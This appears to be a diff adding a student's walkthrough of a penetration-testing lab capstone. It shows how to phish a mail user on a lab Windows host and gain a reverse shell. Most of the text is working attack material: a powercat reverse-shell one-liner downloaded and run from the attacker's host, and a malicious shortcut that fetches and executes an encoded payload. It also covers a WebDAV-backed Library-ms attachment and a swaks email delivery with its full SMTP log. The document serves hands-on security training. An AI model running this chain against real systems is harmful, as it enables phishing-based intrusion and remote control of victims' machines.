@@ -1,0 +1,128 @@
+Questions
+Capstone Exercise: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the Administrator user. You can use VM #3 of VM Group 2 to prepare your attack.
+
+Hint
+1) Scan the ports with nmap.
+2) Start by fuzzing the webserver for some hidden files (pdf,txt) using gobuster or ffuf.
+3) Download any files you have found directly with tools like wget for futre anaylsis such as the creator of the file.
+4) Use the commands provided in Listing 11 to host any malicious file and send the email.
+5) Make sure you mount the correct path where you have the Webdav folder! Is it root/webdav or /home/kali/webdav?
+6) Do not limit yourself with only tool and search for other powershell reverse shells.
+
+setup WebDAV on Kali
+pip3 install wsgidav
+mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
+
+xfreerdp into the VM#3
+xfreerdp /u:'offsec' /p:'lab' /v:192.168.244.194:3389 /size:95% /cert:ignore +clipboard /drive:smbfolder,/home/kali/webdav
+
+nmap scanning
+nmap -sS 192.168.244.199
+25/tcp  open  smtp
+80/tcp  open  http
+110/tcp open  pop3
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+587/tcp open  submission
+
+Fuzz web server
+gobuster dir -u http://192.168.244.199/ -w /usr/share/wordlists/dirb/common.txt -x pdf
+found info.txt
+
+Wget http://192.168.244.199/info.pdf
+
+Examine with Exiftool 
+exiftool -a -u info.pdf
+
+Inside the PDF mentioned
+"ADMIN server hosts an e-mail server, All local addresses are <firstname>.<lastname>@supermagicorg.com"
+"You can test it via test@supermagicorg.com with password test. All accounts of IT staff are already created and usable."
+
+Means we can use <test@supermagic.org> to sent the email to <dave.wizard@supermagicorg.com>
+
+Now we need to prepare the payload
+#kali command prompt
+LHOST=192.168.45.185
+LPORT=8443
+pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://$LHOST:88/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > revshell-pwsh.txt
+
+Make sure the code are hashed and listen to payload remote port
+head revshell-pwsh.txt 
+nc -lvnp 8443
+
+Create a shortcut file "automatic_configuration.lnk" and paste below code to shortcut
+powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.45.185:88/revshell-pwsh.txt'); iex 'powershell -E $code'""
+
+Create a Microsoft Library file "config.Library-ms"
+
+Copy "config.Library-ms" and "automatic_configuration.lnk" file to the webdav folder
+cd /home/kali/webdav
+
+Now payload had prepared, now we can send the Payload through email using swaks.
+swaks -t dave.wizard@supermagicorg.com -s 192.168.196.199:587 -au test@supermagicorg.com -ap test -f test@supermagicorg.com --body email.txt --attach @config.Library-ms --header "Subject: Configurations"
+=== Trying 192.168.244.199:587...
+=== Connected to 192.168.244.199.
+<-  220 ADMIN ESMTP
+ -> EHLO kali
+<-  250-ADMIN
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
+<-  334 UGFzc3dvcmQ6
+ -> dGVzdA==
+<-  235 authenticated.
+ -> MAIL FROM:<test@supermagicorg.com>
+<-  250 OK
+ -> RCPT TO:<dave.wizard@supermagicorg.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Fri, 12 Apr 2024 00:25:52 -0700
+ -> To: dave.wizard@supermagicorg.com
+ -> From: test@supermagicorg.com
+ -> Subject: Configurations
+ -> Message-Id: <20240412002552.141775@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> MIME-Version: 1.0
+ -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_141775"
+ -> 
+ -> ------=_MIME_BOUNDARY_000_141775
+ -> Content-Type: text/plain
+ -> 
+ -> email.txt
+ -> ------=_MIME_BOUNDARY_000_141775
+ -> Content-Type: application/octet-stream; name="config.Library-ms"
+ -> Content-Description: config.Library-ms
+ -> Content-Disposition: attachment; filename="config.Library-ms"
+ -> Content-Transfer-Encoding: BASE64
+ -> 
+ -> PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPGxpYnJhcnlEZXNjcmlwdGlv
+ -> biB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5kb3dzLzIwMDkvbGlicmFy
+ -> eSI+CjxuYW1lPkB3aW5kb3dzLnN0b3JhZ2UuZGxsLC0zNDU4MjwvbmFtZT4KPHZlcnNpb24+Njwv
+ -> dmVyc2lvbj4KPGlzTGlicmFyeVBpbm5lZD50cnVlPC9pc0xpYnJhcnlQaW5uZWQ+CjxpY29uUmVm
+ -> ZXJlbmNlPmltYWdlcmVzLmRsbCwtMTAwMzwvaWNvblJlZmVyZW5jZT4KPHRlbXBsYXRlSW5mbz4K
+ -> PGZvbGRlclR5cGU+ezdkNDlkNzI2LTNjMjEtNGYwNS05OWFhLWZkYzJjOTQ3NDY1Nn08L2ZvbGRl
+ -> clR5cGU+CjwvdGVtcGxhdGVJbmZvPgo8c2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRpb25MaXN0Pgo8
+ -> c2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRpb24+Cjxpc0RlZmF1bHRTYXZlTG9jYXRpb24+dHJ1ZTwv
+ -> aXNEZWZhdWx0U2F2ZUxvY2F0aW9uPgo8aXNTdXBwb3J0ZWQ+ZmFsc2U8L2lzU3VwcG9ydGVkPgo8
+ -> c2ltcGxlTG9jYXRpb24+Cjx1cmw+aHR0cDovLzE5Mi4xNjguNDUuMTg1PC91cmw+Cjwvc2ltcGxl
+ -> TG9jYXRpb24+Cjwvc2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRpb24+Cjwvc2VhcmNoQ29ubmVjdG9y
+ -> RGVzY3JpcHRpb25MaXN0Pgo8L2xpYnJhcnlEZXNjcmlwdGlvbj4=
+ -> 
+ -> ------=_MIME_BOUNDARY_000_141775--
+ -> 
+ -> 
+ -> .
+<-  250 Queued (1.016 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+
+Then get the flag from Administrator user's desktop
